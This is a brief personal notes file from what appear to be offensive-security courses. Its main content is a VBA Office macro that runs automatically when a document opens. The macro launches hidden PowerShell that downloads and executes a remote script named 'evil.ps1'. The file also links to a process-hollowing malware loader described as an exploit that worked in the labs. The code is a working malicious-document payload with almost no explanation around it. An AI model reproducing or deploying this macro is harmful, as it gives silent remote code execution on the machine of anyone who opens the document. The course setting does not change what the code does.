# Notes
Notes from courses


# Macro from challenge 

```vb
Sub MyMacro()
    Dim strArg As String
    strArg = "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/evil.ps1')"
    Shell strArg, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen() 
    MyMacro
End Sub
```

# Exploit that worked well in the labs 
https://github.com/Kr0ff/maldev/blob/main/CSharp/Hollow_Caesar_ExNuma/Program.cs
